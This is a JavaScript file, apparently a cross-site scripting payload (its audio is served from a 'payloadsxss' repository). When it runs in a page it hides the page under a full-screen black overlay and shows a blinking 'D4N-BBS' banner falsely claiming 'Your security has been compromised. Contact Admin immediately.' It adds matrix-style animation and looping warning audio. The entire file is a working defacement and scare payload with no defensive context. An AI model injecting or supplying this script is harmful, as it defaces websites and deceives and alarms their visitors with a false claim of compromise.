(function() {
    
    var overlay = document.createElement('div');
    overlay.style.position = 'fixed';
    overlay.style.top = '0';
    overlay.style.left = '0';
    overlay.style.width = '100%';
    overlay.style.height = '100%';
    overlay.style.backgroundColor = '#000000'; 
    overlay.style.zIndex = 9998; 
    overlay.style.opacity = '1'; 
    document.body.appendChild(overlay);

  
    var container = document.createElement('div');
    container.style.position = 'fixed';
    container.style.top = '0';
    container.style.left = '0';
    container.style.width = '100%';
    container.style.height = '100%';
    container.style.display = 'flex';
    container.style.flexDirection = 'column';
    container.style.alignItems = 'center';
    container.style.justifyContent = 'center';
    container.style.zIndex = 9999;  
    document.body.appendChild(container);

   
    var logo = document.createElement('img');
    logo.src = 'https://i.pinimg.com/originals/85/31/dc/8531dcd1b41923c628eb8ad5d41c9944.gif';  
    logo.style.width = '150px';  
    logo.style.marginBottom = '20px';  
    container.appendChild(logo);

    
    var message = document.createElement('div');
    message.innerHTML = `
        <h1 style="color: #00FF00; font-family: 'Courier New', monospace; text-align: center; font-size: 3em;">
            D4N-BBS
        </h1>
        <p style="color: #00FF00; font-family: 'Courier New', monospace; text-align: center; font-size: 1.5em;">
            Your security has been compromised. Contact Admin immediately.
        </p>
        <p style="color: #00FF00; font-family: 'Courier New', monospace; text-align: center; font-size: 1.2em;">
            System integrity compromised.
        </p>
    `;
    container.appendChild(message);

    
    var blinkStyle = document.createElement('style');
    blinkStyle.type = 'text/css';
    blinkStyle.appendChild(document.createTextNode(`
        @keyframes blink {
            0% { opacity: 1; }
            50% { opacity: 0; }
            100% { opacity: 1; }
        }
        h1, p {
            animation: blink 1s infinite;
        }
    `));
    document.head.appendChild(blinkStyle);

    
    var glitchStyle = document.createElement('style');
    glitchStyle.type = 'text/css';
    glitchStyle.appendChild(document.createTextNode(`
        @keyframes glitch {
            0% { transform: translate(0); }
            20% { transform: translate(-2px, 2px); }
            40% { transform: translate(-2px, -2px); }
            60% { transform: translate(2px, 2px); }
            80% { transform: translate(2px, -2px); }
            100% { transform: translate(0); }
        }
        h1 {
            animation: glitch 0.5s infinite;
        }
    `));
    document.head.appendChild(glitchStyle);

  
    var matrixStyle = document.createElement('style');
    matrixStyle.type = 'text/css';
    matrixStyle.appendChild(document.createTextNode(`
        @keyframes matrix {
            0% { transform: translateY(-100%); }
            100% { transform: translateY(100%); }
        }
        .matrix {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(transparent 90%, #000000 100%);
            z-index: 9997;
            pointer-events: none;
            overflow: hidden;
        }
        .matrix span {
            position: absolute;
            color: #00FF00;
            font-family: 'Courier New', monospace;
            font-size: 1.2em;
            animation: matrix 5s linear infinite;
        }
    `));
    document.head.appendChild(matrixStyle);

  
    var matrixContainer = document.createElement('div');
    matrixContainer.className = 'matrix';
    document.body.appendChild(matrixContainer);

    function createMatrixCode() {
        var span = document.createElement('span');
        span.textContent = String.fromCharCode(Math.floor(Math.random() * 94) + 33);  // Random ASCII character
        span.style.left = Math.random() * window.innerWidth + 'px';
        span.style.animationDuration = Math.random() * 3 + 2 + 's';  // Random speed
        matrixContainer.appendChild(span);

        
        setTimeout(() => span.remove(), 7000);
    }

    
    setInterval(createMatrixCode, 100);

   
    var audio = new Audio('https://cdn.jsdelivr.net/gh/dacabb/payloadsxss@main/warning.mp3');
    audio.loop = true;

   
    audio.muted = true;
    audio.play().then(() => {
        
        setTimeout(() => {
            audio.muted = false;
        }, 1000);  
    }).catch((error) => {
        console.error('Audio autoplay failed:', error);
    });
})();
